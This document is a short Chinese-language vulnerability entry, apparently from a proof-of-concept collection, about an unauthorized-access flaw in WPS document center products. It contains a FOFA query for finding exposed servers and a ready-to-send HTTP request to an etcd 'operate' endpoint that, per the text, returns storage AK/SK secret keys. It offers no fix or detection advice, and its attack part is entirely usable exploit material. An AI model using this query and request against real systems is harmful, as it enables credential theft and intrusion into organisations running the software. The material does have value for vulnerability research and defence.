## WPS文档中心和文档中台-operate-未授权访问漏洞

## 一、漏洞简介
WPS文档中心和文档中台的/open/v6/api/etcd/operate?key=/config/storage&method=get接口存在未授权访问漏洞，攻击者可通过该漏洞获取AK/SK密钥。

## fofa
```
body="content=\"WPS文档中心" || (body="window.PUBLICPATH=" && body="window.WEBPATH=")
```

## POC
```
GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: keep-alive
```
